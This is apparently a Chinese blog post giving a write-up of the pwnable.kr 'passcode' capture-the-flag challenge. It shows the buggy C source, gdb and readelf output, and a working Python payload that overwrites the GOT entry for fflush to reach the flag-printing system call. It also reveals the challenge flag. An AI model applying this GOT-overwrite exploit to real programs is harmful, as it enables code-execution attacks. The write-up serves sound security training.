---
id: 45
title: pwnable.kr-passcode
date: 2016-07-15T09:13:34+00:00
author: admin
layout: post
guid: http://www.ikow.cn/?p=45
permalink: /pwnable-kr-passcode/
categories:
  - pwn
tags:
  - canary
  - exploit
  - gdb
  - GOT覆盖
  - peda
  - pwn
  - pwnable.kr
  - shellcode
  - 溢出
---
依然是题目描述：

> Mommy told me to make a passcode based login system.
  
> My initial C code was compiled without any error!
  
> Well, there was some compiler warning, but who cares about that?
> 
> ssh passcode@pwnable.kr -p2222 (pw:guest)

连上后，目录下有c源码和可执行文件，

首先查看下程序开了那些防护措施：

> gdb-peda$ checksec
  
> CANARY : ENABLED
  
> FORTIFY : disabled
  
> NX : ENABLED
  
> PIE : disabled
  
> RELRO : Partial

这里开启了canary，所以我们只能够利用一次任意内存写的功能，无法通过写入shellcode 再到跳转到shellcode的地址来exploit（至少写文章的时候我还不会其他方法），同样的我们在反汇编的代码中也可以看出来采用了canary：

gdb-peda$ disas welcome
  
Dump of assembler code for function welcome:
   
0x08048609 <+0>: push ebp
   
0x0804860a <+1>: mov ebp,esp
   
0x0804860c <+3>: sub esp,0x88
   
0x08048612 <+9>: mov eax,gs:0x14
   
0x08048618 <+15>: mov DWORD PTR [ebp-0xc],eax
   
0x0804861b <+18>: xor eax,eax
   
0x0804861d <+20>: mov eax,0x80487cb
   
0x08048622 <+25>: mov DWORD PTR [esp],eax
   
0x08048625 <+28>: call 0x8048420 <printf@plt>
   
0x0804862a <+33>: mov eax,0x80487dd
   
0x0804862f <+38>: lea edx,[ebp-0x70]
   
0x08048632 <+41>: mov DWORD PTR [esp+0x4],edx
   
0x08048636 <+45>: mov DWORD PTR [esp],eax
   
0x08048639 <+48>: call 0x80484a0 <_\_isoc99\_scanf@plt>
   
0x0804863e <+53>: mov eax,0x80487e3
   
0x08048643 <+58>: lea edx,[ebp-0x70]
   
0x08048646 <+61>: mov DWORD PTR [esp+0x4],edx
   
0x0804864a <+65>: mov DWORD PTR [esp],eax
   
0x0804864d <+68>: call 0x8048420 <printf@plt>
   
0x08048652 <+73>: mov eax,DWORD PTR [ebp-0xc]
   
0x08048655 <+76>: xor eax,DWORD PTR gs:0x14
   
0x0804865c <+83>: je 0x8048663 <welcome+90>
   
0x0804865e <+85>: call 0x8048440 <_\_stack\_chk_fail@plt>
   
0x08048663 <+90>: leave
   
0x08048664 <+91>: ret
  
End of assembler dump.

开始的时候有个mov eax, gs:0x14，结尾的时候有个xor eax,gs:0x14，通过存储函数运行前后堆栈的状态来判断是否有栈溢出，从而进行保护。这里如果我们要进行利用，只能在结束的检测之前利用完成，或者在检测中只是进行构造利用代码，不影响栈的状态，然后在随后的程序中进行利用。

源码为：

<pre class="brush: cpp; title: ; notranslate" title="">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

void login(){
 int passcode1;
 int passcode2;

 printf("enter passcode1 : ");
 scanf("%d", passcode1);
 fflush(stdin);

 // ha! mommy told me that 32bit is vulnerable to bruteforcing 🙂
 printf("enter passcode2 : ");
 scanf("%d", passcode2);

 printf("checking...\n");
 if(passcode1==338150 && passcode2==13371337){
 printf("Login OK!\n");
 system("/bin/cat flag");
 }
 else{
 printf("Login Failed!\n");
 exit(0);
 }
}

void welcome(){
 char name[100];
 printf("enter you name : ");
 scanf("%100s", name);
 printf("Welcome %s!\n", name);
}

int main(){
 printf("Toddler's Secure Login System 1.0 beta.\n");

 welcome();
 login();

 // something after login...
 printf("Now I can safely trust you that you have credential :)\n");
 return 0; 
}
</pre>

我们可以看到scanf接受的参数写错了，没有加取地址符号，这样就会把参数中的数值作为地址进行写入了，现在的问题是我们如何来控制passcode1的内容呢？我们用gdb对程序进行调试：

> gdb-peda$ r
  
> Starting program: /root/Desktop/passcode
  
> Toddler&#8217;s Secure Login System 1.0 beta.
  
> [&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;-registers&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8211;]
  
> EAX: 0x28 (&#8216;(&#8216;)
  
> EBX: 0x0
  
> ECX: 0xf7fd3028 &#8211;> 0x0
  
> EDX: 0xf7fb0870 &#8211;> 0x0
  
> ESI: 0x1
  
> EDI: 0xf7faf000 &#8211;> 0x1b3db0
  
> EBP: 0xffffd888 &#8211;> 0xffffd8a8 &#8211;> 0x0
  
> ESP: 0xffffd800 &#8211;> 0xf7fafd60 &#8211;> 0xfbad2a84
  
> EIP: 0x8048612 (<welcome+9>: mov eax,gs:0x14)
  
> EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
  
> [&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;-code&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;-]
  
> 0x8048609 <welcome>: push ebp
  
> 0x804860a <welcome+1>: mov ebp,esp
  
> 0x804860c <welcome+3>: sub esp,0x88
  
> => 0x8048612 <welcome+9>: mov eax,gs:0x14
  
> 0x8048618 <welcome+15>: mov DWORD PTR [ebp-0xc],eax
  
> 0x804861b <welcome+18>: xor eax,eax
  
> 0x804861d <welcome+20>: mov eax,0x80487cb
  
> 0x8048622 <welcome+25>: mov DWORD PTR [esp],eax
  
> [&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;stack&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;-]
  
> 0000| 0xffffd800 &#8211;> 0xf7fafd60 &#8211;> 0xfbad2a84
  
> 0004| 0xffffd804 &#8211;> 0x27 (&#8220;&#8216;&#8221;)
  
> 0008| 0xffffd808 &#8211;> 0xf7fafd60 &#8211;> 0xfbad2a84
  
> 0012| 0xffffd80c &#8211;> 0xf7e6734b (<\_IO\_file_overflow+219>: add esp,0x10)
  
> 0016| 0xffffd810 &#8211;> 0xf7fafd60 &#8211;> 0xfbad2a84
  
> 0020| 0xffffd814 &#8211;> 0xf7fd3000 (&#8220;Toddler&#8217;s Secure Login System 1.0 beta.\n&#8221;)
  
> 0024| 0xffffd818 &#8211;> 0x28 (&#8216;(&#8216;)
  
> 0028| 0xffffd81c &#8211;> 0xf7e6727c (<\_IO\_file_overflow+12>: add edx,0x147d84)
  
> [&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;]
  
> Legend: code, data, rodata, value
> 
> Breakpoint 1, 0x08048612 in welcome ()

当我们断点在welcome函数中时，ebp的内容为：0xffffd888

> gdb-peda$ c
  
> Continuing.
  
> enter you name : aaaaa
  
> Welcome aaaaa!
  
> [&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;-registers&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8211;]
  
> EAX: 0x0
  
> EBX: 0x0
  
> ECX: 0x7ffffff2
  
> EDX: 0xf7fb0870 &#8211;> 0x0
  
> ESI: 0x1
  
> EDI: 0xf7faf000 &#8211;> 0x1b3db0
  
> EBP: 0xffffd888 &#8211;> 0xffffd8a8 &#8211;> 0x0
  
> ESP: 0xffffd860 &#8211;> 0xf7fe83cb (add ebp,0x14c35)
  
> EIP: 0x804856a (<login+6>: mov eax,0x8048770)
  
> EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
  
> [&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;-code&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;-]
  
> 0x8048564 <login>: push ebp
  
> 0x8048565 <login+1>: mov ebp,esp
  
> 0x8048567 <login+3>: sub esp,0x28
  
> => 0x804856a <login+6>: mov eax,0x8048770
  
> 0x804856f <login+11>: mov DWORD PTR [esp],eax
  
> 0x8048572 <login+14>: call 0x8048420 <printf@plt>
  
> 0x8048577 <login+19>: mov eax,0x8048783
  
> 0x804857c <login+24>: mov edx,DWORD PTR [ebp-0x10]
  
> [&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;stack&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;-]
  
> 0000| 0xffffd860 &#8211;> 0xf7fe83cb (add ebp,0x14c35)
  
> 0004| 0xffffd864 &#8211;> 0xf7dfa700 (0xf7dfa700)
  
> 0008| 0xffffd868 &#8211;> 0x0
  
> 0012| 0xffffd86c &#8211;> 0xf7fafd60 &#8211;> 0xfbad2a84
  
> 0016| 0xffffd870 &#8211;> 0xffffd8a8 &#8211;> 0x0
  
> 0020| 0xffffd874 &#8211;> 0xf7feec80 (pop edx)
  
> 0024| 0xffffd878 &#8211;> 0xf7e5cbeb (<puts+11>: add ebx,0x152415)
  
> 0028| 0xffffd87c &#8211;> 0xfb14c000
  
> [&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;]
  
> Legend: code, data, rodata, value
> 
> Breakpoint 2, 0x0804856a in login ()

当我们断在login函数中时，发现ebp的内容也为：0xffffd888。

在ida中我们发现，name的地址为：[ebp-70h] passcode1的地址为[ebp-10h]，两个地址在同一个堆栈中，而且相差为70h-10h=60h=96，而name的大小为100个字节，那么正好我们可以通过name的后四个字节来覆盖passcode1的内容。

接下来如何利用写入passcode1的地址来控制eip跳转到执行cat flag的地方，或者是跳转到我们的shellcode呢？

这里使用了GOT覆盖技术，GOT覆盖可以理解为一个程序中调用函数的表，我们利用name的后四个字节控制了scanf写入内容的地址，然后通过scanf改写GOT表，使eip跳转到我们制定的地方，我们看下程序中调用system的地址：

> 0x080485e3 <+127>: mov DWORD PTR [esp],0x80487af
  
> 0x080485ea <+134>: call 0x8048460 <system@plt>

可以看到地址为0x080485e3 这个地址是我们需要将GOT表中内容覆盖的地址，换成10进制就是：134514147，我们再看下passcode的GOT表：

> ➜ Desktop readelf -r passcode
> 
> Relocation section &#8216;.rel.dyn&#8217; at offset 0x388 contains 2 entries:
  
> Offset Info Type Sym.Value Sym. Name
  
> 08049ff0 00000606 R\_386\_GLOB\_DAT 00000000 \\_\_gmon\_start\\_\_
  
> 0804a02c 00000b05 R\_386\_COPY 0804a02c stdin@GLIBC_2.0
> 
> Relocation section &#8216;.rel.plt&#8217; at offset 0x398 contains 9 entries:
  
> Offset Info Type Sym.Value Sym. Name
  
> 0804a000 00000107 R\_386\_JUMP\_SLOT 00000000 printf@GLIBC\_2.0
  
> 0804a004 00000207 R\_386\_JUMP\_SLOT 00000000 fflush@GLIBC\_2.0
  
> 0804a008 00000307 R\_386\_JUMP\_SLOT 00000000 \_\_stack\_chk\_fail@GLIBC\_2.4
  
> 0804a00c 00000407 R\_386\_JUMP\_SLOT 00000000 puts@GLIBC\_2.0
  
> 0804a010 00000507 R\_386\_JUMP\_SLOT 00000000 system@GLIBC\_2.0
  
> 0804a014 00000607 R\_386\_JUMP\_SLOT 00000000 \\_\_gmon\_start\\_\_
  
> 0804a018 00000707 R\_386\_JUMP\_SLOT 00000000 exit@GLIBC\_2.0
  
> 0804a01c 00000807 R\_386\_JUMP\_SLOT 00000000 \_\_libc\_start\_main@GLIBC\_2.0
  
> 0804a020 00000907 R\_386\_JUMP\_SLOT 00000000 \_\_isoc99\_scanf@GLIBC_2.7

我们看到在system和printf passcode1之间调用了printf fflush，所以这些函数在GOT中的地址我们都可以利用，这里选择fflush的地址0x0804a004，这个地址是需要利用name的后四位进行覆盖的，所以我们最终的payload为：

> passcode@ubuntu:~$ python -c &#8220;print(&#8216;a&#8217;*96+&#8217;\x04\xa0\x04\x08\n&#8217;+&#8217;134514147\n&#8217;)&#8221; | ./passcode
  
> Toddler&#8217;s Secure Login System 1.0 beta.
  
> enter you name : Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�!
  
> Sorry mom.. I got confused about scanf usage 🙁
  
> enter passcode1 : Now I can safely trust you that you have credential 🙂

所以flag为：

Sorry mom.. I got confused about scanf usage 🙁